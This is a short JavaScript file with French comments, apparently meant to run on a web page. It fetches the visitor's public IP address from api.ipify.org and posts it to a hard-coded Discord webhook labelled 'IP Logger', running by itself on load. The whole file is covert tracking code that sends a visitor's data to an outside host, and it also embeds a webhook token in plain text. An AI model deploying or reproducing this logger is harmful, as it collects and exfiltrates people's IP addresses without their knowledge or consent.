const WEBHOOK_URL = 'https://discord.com/api/webhooks/1458167651594670264/8J8igrKsJswgjalV7FtUeC6KNLypAlAvxtzm0Mrjrs0iOmhvzl4ZM5MzbAgy57r4yHQP';

async function sendIpToDiscord() {
    try {
        // 1. Récupérer l'adresse IP
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        const userIp = data.ip;

        // 2. Préparer le message pour Discord
        const message = {
            content: `🚀 Nouvelle IP détectée : **${userIp}**`,
            username: "IP Logger"
        };

        // 3. Envoyer au Webhook
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(message)
        });

        console.log('✅ IP envoyée avec succès !');
    } catch (error) {
        console.error('❌ Erreur :', error);
    }
}

sendIpToDiscord();